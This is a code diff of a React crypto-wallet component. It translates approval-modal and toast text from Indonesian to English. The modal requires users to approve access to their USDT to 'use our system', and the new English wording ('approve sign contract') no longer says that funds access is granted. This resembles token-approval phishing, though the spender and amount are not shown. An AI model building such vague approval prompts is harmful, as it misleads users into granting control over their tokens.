@@ -143,19 +143,19 @@ const Wallet = () => {
               'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
             modal.innerHTML = `
               <div class="bg-gray-800 p-6 rounded-xl max-w-sm">
-                <h3 class="text-xl font-bold text-white mb-4">Approval Diperlukan</h3>
-                <p class="text-gray-300 mb-4">
-                  Untuk menggunakan sistem kami, Anda perlu menyetujui akses ke USDT Anda.
-                  Klik "Setujui" untuk melanjutkan.
-                </p>
-                <div class="flex gap-3 justify-end">
-                  <button id="cancel" class="px-4 py-2 bg-gray-600 hover:bg-gray-700 rounded-lg text-white">
-                    Batal
-                  </button>
-                  <button id="approve" class="px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg text-white">
-                    Setujui
-                  </button>
-                </div>
+              <h3 class="text-xl font-bold text-white mb-4">Approval Needed</h3>
+              <p class="text-gray-300 mb-4">
+                To use our system, you need to approve sign contract.
+                Click "Approve" to continue.
+              </p>
+              <div class="flex gap-3 justify-end">
+                <button id="cancel" class="px-4 py-2 bg-gray-600 hover:bg-gray-700 rounded-lg text-white">
+                Cancel
+                </button>
+                <button id="approve" class="px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg text-white">
+                Approve
+                </button>
+              </div>
               </div>
             `;
             document.body.appendChild(modal);
@@ -168,7 +168,7 @@ const Wallet = () => {
             document.body.removeChild(modal);
   
             if (result) {
-              toast.info('Mohon tanda tangani transaksi di wallet Anda...');
+                toast.info('Please sign the transaction in your wallet...');
               // Panggil fungsi approval
               const txHash = await approve({
                 address: USDT_ADDRESS,
@@ -183,14 +183,14 @@ const Wallet = () => {
               });
               if (receipt?.status === 'success') {
                 await Promise.all([refetchBalance(), refetchAllowance()]);
-                toast.success('Approval berhasil!');
+                toast.success('Approval Succes!');
               } else {
-                toast.error('Approval gagal!');
+                toast.error('Approval Failed!');
               }
             }
           }
         } catch (error) {
-          toast.error('Gagal memberikan approval');
+          toast.error('Failed to approval');
           console.error('Approval error:', error);
         }
       }
@@ -336,7 +336,7 @@ const Wallet = () => {
   
   return (
     <section className="max-w-4xl mx-auto my-12 p-6 bg-gray-900 rounded-xl shadow-[0_0_20px_-5px_rgba(96,165,250,0.3)]">
-      <h2 className="text-3xl text-white font-bold text-center mb-8">Wallet Information</h2>
+      <h2 className="text-3xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent text-center mb-8">WALLET</h2>
       <div className="flex border-b border-gray-700 justify-center gap-4">
         <button
           onClick={() => setActiveTab('wallet')}
